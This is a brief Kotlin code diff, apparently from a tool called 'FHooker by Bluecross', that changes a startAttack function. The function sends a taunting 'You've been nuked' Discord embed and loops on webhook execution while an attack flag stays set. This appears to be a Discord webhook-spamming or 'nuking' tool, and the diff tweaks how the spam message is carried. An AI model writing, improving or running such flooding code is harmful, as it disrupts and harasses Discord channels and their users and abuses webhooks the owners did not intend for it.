@@ -23,8 +23,9 @@ fun startAttack() {
                     .setTitle("You've been nuked :3")
                     .setDescription("FHooker by Bluecross")
                     .setColor(Color.RED)
-                    .addField("You are L <3", text, false)
+
             )
+            discord.setContent(text)
             while (timerThr != null && Globals.attackingRn && !timerThr!!.isInterrupted && timerThr!!.isAlive) {
                 discord.execute()
                 log("tried to send at ${Globals.webhook}")
